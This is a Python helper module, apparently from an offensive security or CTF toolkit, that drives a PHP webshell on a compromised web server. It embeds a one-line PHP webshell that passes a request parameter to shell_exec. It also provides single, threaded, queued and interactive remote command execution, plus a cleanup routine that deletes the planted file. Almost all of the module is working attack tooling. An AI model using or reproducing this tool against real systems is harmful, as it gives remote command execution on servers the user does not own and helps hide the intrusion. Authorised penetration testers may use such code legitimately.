"""
This module contains useful helper objects for webshells
"""
import logging
from queue import Empty
from threading import Thread
import requests


class BasicWebShell:
    """
    A basic webshell handler
    """

    def __init__(
        self,
        url,
        arg=None,
        request_type="GET",
        delete_on_exit=False,
        target_os="unix",
        interactive_prompt="\nweb-shell > ",
        timeout=30,
    ):
        """
        Constructor for the webshell class

        :param str url: The url path to the webshell
            (e.g. http://127.0.0.1/shell.php)
        :param str arg: The argument that the webshell uses for its command,
            e.g. 'cmd' with a GET request looks like:
            http://127.0.0.1/shell.php?cmd=<command>
        :param str request_type: GET or POST. GET will use the URL path command
            and POST will send the variable in the body of the request.
        :param bool delete_on_exit: If the webshell file should be left behind
            on exit. This will attempt to run one last command of
            'del shell.php' or 'rm shell.php' depending on the target OS.
        :param str target_os: win or unix, will change the exit_on_delete
            command used.
        :param str interactive_prompt: What to print at the start of each new
            interactive command input prompt.
        :param float timeout: Time out on the request call.
        """
        self.logger = logging.getLogger(f"BasicWebShell_{url}")
        self.url = url
        if url.endswith("/"):
            self.file = url[:-1].split("/")[-1]
        else:
            self.file = url.split("/")[-1]
        if arg is None:
            self.arg = "cmd"
        else:
            self.arg = arg
        self.request_type = request_type
        self.delete_on_exit = delete_on_exit
        self.target_os = target_os
        self.interactive_prompt = interactive_prompt
        self.interactive_delete = False
        self.timeout = timeout
        self.src = (
            f"<?" f'php echo shell_exec($_{self.request_type}["{self.arg}"]);' f" ?>"
        )

    def exec(self, command, timeout=None):
        """
        Execute a single command on a web shell.

        :param str command: the command to run.
        :param float timeout: the request timeout.
        """
        if timeout is None:
            timeout = self.timeout

        self.logger.info("Executing command: %s", command)
        if self.request_type == "GET":
            resp = requests.get(
                url=self.url, params={self.arg: command}, timeout=timeout
            )
        elif self.request_type == "POST":
            resp = requests.post(
                url=self.url, data={self.arg: command}, timeout=timeout
            )
        else:
            raise ValueError(
                "Request Type %s is not a valid value." % self.request_type
            )

        resp.raise_for_status()
        try:
            return resp.content.decode("utf-8")
        except UnicodeDecodeError:
            return resp.content.decode("latin-1")  # Fallback

    def _exec_async(self, command, timeout=None, result_queue=None):
        """
        Run a single command and put into a result queue
        """
        result = self.exec(command, timeout)
        if result_queue is not None:
            result_queue.put_nowait((command, result))

    def exec_async(self, command, timeout=None, result_queue=None):
        """
        Run a single command as a threaded instance and return to the
        caller. If the called has provided a result_queue then the result will
        be put in there. Otherwise the thread will just run.
        """
        executer = Thread(
            target=self._exec_async, args=(command, timeout, result_queue), daemon=True
        )
        executer.start()

        return executer

    def _queue_exec(self, command_queue, result_queue, timeout=30, queue_timeout=1):
        """
        Pull commands of a queue and run them

        :param Queue command_queue: queue of commands to run
        :param Queue result_queue: result queue of items (command, result)
        :param float timeout: How long to wait on the request
        :param float queue_timeout: How long to wait on new queue items
        """
        while True:
            try:
                command = command_queue.get(timeout=queue_timeout)
                result = self.exec(command, timeout=timeout)
            except Empty:
                break
            except requests.exceptions.HTTPError:
                result = None

            result_queue.put_nowait((command, result))

    def queue_exec(self, command_queue, result_queue, timeout=30, queue_timeout=1):
        """
        Runs a demon thread to execute commands from a command_queue and will
        put the results into a result queue.

        :param Queue command_queue: queue of commands to run
        :param Queue result_queue: result queue of items (command, result)
        :param float timeout: How long to wait on each request
        :param float queue_timeout: How long to wait on new queue items
        """
        executer = Thread(
            target=self._queue_exec,
            args=(command_queue, result_queue, timeout, queue_timeout),
            daemon=True,
        )
        executer.start()

        return executer

    def batch_exec(self, commands):
        """
        Execute commands given from a list and yield each result.
        """
        for cmd in commands:
            yield cmd, self.exec(cmd)

    def delete(self, force=False):
        """
        Delete the php file
        :param bool force: delete regardless of delete_on_exit
        """
        if not self.delete_on_exit and not force:
            self.logger.info("delete_on_exit is False, NOT deleting php file.")
            return

        if self.target_os == "unix":
            cmd = f"rm {self.file}"
        elif self.target_os == "win":
            cmd = f"del {self.file}"
        else:
            raise ValueError("Target os %s was invalid" % self.target_os)

        self.logger.info("Deleting php file.")
        self.exec(cmd)

    def interactive(self):
        """
        Run an interactive web shell session until quit.
        """
        print(
            "BasicWebShell:\n"
            "\tSimply run your normal shell commands (e.g. whoami)\n"
            "Commands:\n"
            "\t/webshell exit - exit the webshell "
            "(will delete if delete_on_exit is True)\n"
            "\t/webshell delexit - exit the webshell and delete the php file "
            "ignoring the delete_on_exit value\n"
        )
        while True:
            cmd = input(self.interactive_prompt)
            if cmd.lower().strip() == "/webshell delexit":
                self.delete_on_exit = True
                self.delete()
                break
            if cmd.lower().strip() == "/webshell exit":
                self.delete()
                break

            try:
                resp = self.exec(cmd)
                print(resp)
            except requests.exceptions.HTTPError as http_err:
                raise ConnectionError(
                    "Webshell at %s failed to execute."
                    "Exiting interactive mode." % self.url
                ) from http_err

        self.interactive_delete = True
        self.logger.info("Leaving BasicWebShell...\n")

    def __enter__(self):
        self.interactive_delete = False
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        """
        Call delete of the php file in a managed context if delete was not
        called via an interactive session.
        """
        try:
            if not self.interactive_delete:
                self.delete()
        except requests.exceptions.HTTPError:
            pass
